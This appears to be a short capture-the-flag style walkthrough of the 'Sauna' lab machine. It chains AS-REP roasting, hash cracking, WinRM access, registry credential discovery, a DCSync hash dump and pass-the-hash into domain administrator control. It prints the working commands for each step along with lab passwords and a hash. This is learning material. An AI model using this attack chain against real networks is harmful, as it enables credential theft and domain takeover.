# Sauna: Machine Notes

## Recon

### Nmap
- Port 80/tcp: HTTP (Egotistical Bank)
- Port 88/tcp: Kerberos
- Port 389/tcp: LDAP
- Port 445/tcp: SMB
- Port 5985/tcp: WinRM
- Domain: `EGOTISTICAL-BANK.LOCAL`

## Initial Access

### AS-REP Roasting
- Used a username list to check for users without Kerberos pre-authentication required:
```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt -dc-ip sauna.htb -no-pass -request
```
- Captured hash for user `fsmith`.
- Cracked with Hashcat:
```bash
hashcat -m 18200 fsmith_hash.txt /usr/share/wordlists/rockyou.txt
```
- Password: `Thestrokes23`

### Foothold
- Accessed via WinRM:
```bash
evil-winrm -i sauna.htb -u fsmith -p 'Thestrokes23'
```

## Lateral Movement

### Autologon Credentials (svc_loanmgr)
- Ran `WinPeas` on the target and discovered Autologon credentials in the registry:
  - DefaultUserName: `EGOTISTICALBANK\svc_loanmanager`
  - DefaultPassword: `Moneymakestheworldgoround!`

## Privilege Escalation

### DCSync Attack
- `svc_loanmgr` has DCSync rights.
- Dumped domain hashes using `secretsdump`:
```bash
impacket-secretsdump 'EGOTISTICAL-BANK/svc_loanmgr:Moneymakestheworldgoround!'@10.129.95.180 -dc-ip 10.129.95.180
```
- Captured Administrator NTLM hash: `823452073d75b9d1cf70ebdf86c7f98e`

### Root Access
- Accessed via WinRM using Pass-the-Hash:
```bash
evil-winrm -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.129.95.180
```
